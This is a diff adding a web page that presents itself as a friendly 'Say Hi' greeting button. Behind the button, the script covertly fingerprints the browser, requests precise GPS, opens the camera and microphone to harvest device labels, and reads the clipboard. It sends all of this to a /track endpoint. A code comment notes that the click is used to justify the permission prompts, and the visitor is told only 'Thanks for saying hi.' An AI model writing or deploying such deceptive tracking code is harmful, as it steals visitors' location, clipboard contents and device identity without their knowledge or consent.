@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Say Hi 👋</title>
+<style>
+  html, body {
+    height: 100%; margin: 0; display: grid; place-items: center;
+    background: radial-gradient(circle at 50% 30%, #1e293b, #0f172a);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: #fff; overflow: hidden;
+  }
+  .wrap { text-align: center; padding: 20px; }
+  h1 { font-weight: 300; font-size: clamp(1.6rem, 6vw, 3rem); margin: 0 0 6px; }
+  p  { opacity: .7; margin: 0 0 32px; }
+  button {
+    font-size: 1.2rem; padding: 16px 42px; border: 0; border-radius: 999px;
+    background: linear-gradient(135deg, #f472b6, #a78bfa);
+    color: #fff; cursor: pointer; font-weight: 600;
+    box-shadow: 0 10px 30px rgba(167,139,250,.4);
+    transition: transform .15s, box-shadow .15s;
+  }
+  button:hover { transform: translateY(-2px) scale(1.03); }
+  button:active { transform: scale(.97); }
+  .status { margin-top: 24px; font-size: .85rem; opacity: .5; min-height: 1.2em; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>👋 Say Hi!</h1>
+    <p>Tap the button to say hello back</p>
+    <button id="hiBtn">Say Hi</button>
+    <div class="status" id="status"></div>
+  </div>
+
+<script>
+const statusEl = document.getElementById('status');
+const log = m => { statusEl.textContent = m; };
+
+async function buildFingerprint() {
+  const nav = navigator, scr = screen;
+
+  const c = document.createElement('canvas');
+  const ctx = c.getContext('2d');
+  ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+  ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 30);
+  ctx.fillStyle = '#069'; ctx.fillText('fingerprint-me-🎯', 2, 15);
+  const canvasHash = c.toDataURL();
+
+  const gl = document.createElement('canvas').getContext('webgl');
+  const dbg = gl && gl.getExtension('WEBGL_debug_renderer_info');
+  const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'n/a';
+  const gpuVendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'n/a';
+
+  let battery = {};
+  if (nav.getBattery) {
+    try { const b = await nav.getBattery(); battery = { level: b.level, charging: b.charging }; } catch (_) {}
+  }
+
+  const data = {
+    userAgent: nav.userAgent,
+    platform: nav.platform,
+    languages: nav.languages,
+    language: nav.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    deviceMemory: nav.deviceMemory,
+    hardwareConcurrency: nav.hardwareConcurrency,
+    maxTouchPoints: nav.maxTouchPoints,
+    gpu, gpuVendor,
+    screen: {
+      width: scr.width, height: scr.height,
+      availWidth: scr.availWidth, availHeight: scr.availHeight,
+      colorDepth: scr.colorDepth, pixelRatio: devicePixelRatio,
+      orientation: scr.orientation && scr.orientation.type
+    },
+    connection: nav.connection ? {
+      type: nav.connection.effectiveType,
+      downlink: nav.connection.downlink,
+      rtt: nav.connection.rtt
+    } : null,
+    online: nav.onLine,
+    canvasHash: canvasHash.slice(0, 200),
+    webdriver: nav.webdriver,
+    cookieEnabled: nav.cookieEnabled,
+    pdfViewerEnabled: nav.pdfViewerEnabled,
+    plugins: [...nav.plugins].map(p => p.name),
+    battery,
+    referrer: document.referrer,
+    url: location.href
+  };
+
+  const enc = new TextEncoder().encode(JSON.stringify(data));
+  const buf = await crypto.subtle.digest('SHA-256', enc);
+  data.fingerprintId = [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
+  return data;
+}
+
+function send(payload) {
+  return fetch('/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(() => {});
+}
+
+document.getElementById('hiBtn').addEventListener('click', async () => {
+  log('Saying hi…');
+
+  const payload = await buildFingerprint();
+
+  // GPS — the click justifies the prompt
+  const gps = await new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({
+        lat: p.coords.latitude, lon: p.coords.longitude,
+        accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+        speed: p.coords.speed, heading: p.coords.heading
+      }),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+  payload.gps = gps;
+
+  // Media device labels (real camera/mic names)
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    payload.mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label, id: d.deviceId }));
+    stream.getTracks().forEach(t => t.stop());
+  } catch (_) {
+    payload.mediaDevices = await navigator.mediaDevices.enumerateDevices()
+      .then(d => d.map(x => ({ kind: x.kind, label: x.label }))).catch(() => []);
+  }
+
+  // Clipboard (needs gesture)
+  try { payload.clipboard = await navigator.clipboard.readText(); } catch (_) {}
+
+  // Fonts via measurement
+  const testFonts = ['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Trebuchet MS','Palatino','Garamond','Futura','Menlo','Monaco','Consolas','Roboto','Segoe UI'];
+  const base = ['monospace','sans-serif','serif'];
+  const span = document.createElement('span');
+  span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
+  span.textContent = 'mmmmmmmmmmlli';
+  document.body.appendChild(span);
+  const baseSizes = {};
+  base.forEach(b => { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth; });
+  payload.fonts = testFonts.filter(f => base.some(b => {
+    span.style.fontFamily = `'${f}',${b}`;
+    return span.offsetWidth !== baseSizes[b];
+  }));
+  document.body.removeChild(span);
+
+  // Storage estimate
+  try { payload.storage = await navigator.storage.estimate(); } catch (_) {}
+
+  // Permission states
+  payload.permissions = {};
+  for (const name of ['geolocation','notifications','camera','microphone','clipboard-read']) {
+    try {
+      const p = await navigator.permissions.query({ name });
+      payload.permissions[name] = p.state;
+    } catch (_) {}
+  }
+
+  await send(payload);
+  log('✅ Sent! Thanks for saying hi.');
+});
+</script>
+</body>
+</html>
